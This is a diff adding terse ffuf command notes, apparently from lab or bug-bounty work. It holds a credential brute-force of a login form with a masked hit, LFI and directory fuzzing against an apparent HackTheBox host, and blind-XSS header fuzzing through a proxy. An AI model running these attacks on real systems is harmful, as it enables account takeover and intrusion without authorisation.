@@ -1,5 +1,91 @@
 
 
+
+#############################################
+#############################################
+
+ 2099  ffuf -c -request request.txt -request-proto http -mode clusterbomb -w users.txt:HFUZZ -w rockyou-50.txt:WFUZZ -v
+ 2101  ffuf -c -request request.txt -request-proto http -mode clusterbomb -w users.txt:HFUZZ -w rockyou-50.txt:WFUZZ -fc 401 -v
+
+ 2106  ffuf -c -request request.txt -request-proto http -mode clusterbomb -w users.txt:HFUZZ -w rockyou-50.txt:WFUZZ -fc 401 -v
+ 2107  ffuf -c -request request.txt -request-proto http -mode clusterbomb -w users.txt:HFUZZ -w rockyou-50.txt:WFUZZ -mc 200
+ 2108  ffuf -c -request request.txt -request-proto http -mode clusterbomb -w users.txt:HFUZZ -w rockyou-50.txt:WFUZZ -mc 200,301,302
+ 2109  ffuf -c -request request.txt -request-proto http -mode clusterbomb -w users.txt:HFUZZ -w rockyou-50.txt:WFUZZ -mc 200,301,302,300
+
+ 2113  ffuf -c -request request.txt -request-proto http -mode clusterbomb -w users.txt:HFUZZ -w rockyou-50.txt:WFUZZ -mc 200,301,302,300
+ 2114  history
+
+
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://interface/login
+ :: Wordlist         : HFUZZ: DONE
+ :: Wordlist         : WFUZZ: /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt
+ :: Header           : Accept: application/json, text/plain, */*
+ :: Header           : Accept-Encoding: gzip, deflate
+ :: Header           : Origin: http://interface
+ :: Header           : Referer: http://interface/
+ :: Header           : Host: interface
+ :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+ :: Header           : Accept-Language: en-US,en;q=0.5
+ :: Header           : Content-Type: application/json
+ :: Header           : Connection: close
+ :: Data             : {"username":"HFUZZ","password":"WFUZZ"}
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,301,302
+________________________________________________
+
+[Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 104ms]
+| URL | http://interface/logintho
+    * HFUZZ: XXX
+    * WFUZZ: XXX
+
+
+#############################################
+#############################################
+
+
+ffuf -c -request request.txt -request-proto http -mode clusterbomb -w DONE:HFUZZ -w /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt:WFUZZ -mc 200,301,302 -v
+
+POST /login HTTP/1.1
+Host: interface
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 47
+Origin: http://as;dfklna;sdflkasdfe
+Connection: close
+Referer: http://a;sldfnaskdf;nalskdfnafd
+
+{"username":"HFUZZ","password":"WFUZZ"}
+
+
+#############################################
+#############################################
+
+ffuf -u http://pikaboo.htb/admin../admin_staging/index.php?page=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -t 200 -c -fs 15349
+
+ffuf -u http://pikaboo.htb/admin../FUZZ -w /usr/share/wordlists/dirb/big.txt -t 200
+
+ffuf -u http://10.10.10.249//admin../FUZZ/ -w /usr/share/wordlists/dirb/big.txt
+
+
+#############################################
+#############################################
+
 ffuf -c -u FUZZ1 -H "FUZZ2: FUZZ3" -w alive_uber.txt:FUZZ1 -w headers.txt:FUZZ2 -w blind_xss.txt:FUZZ3 -x http://192.168.196.1:8082 -mode clusterbomb -v 
 
 
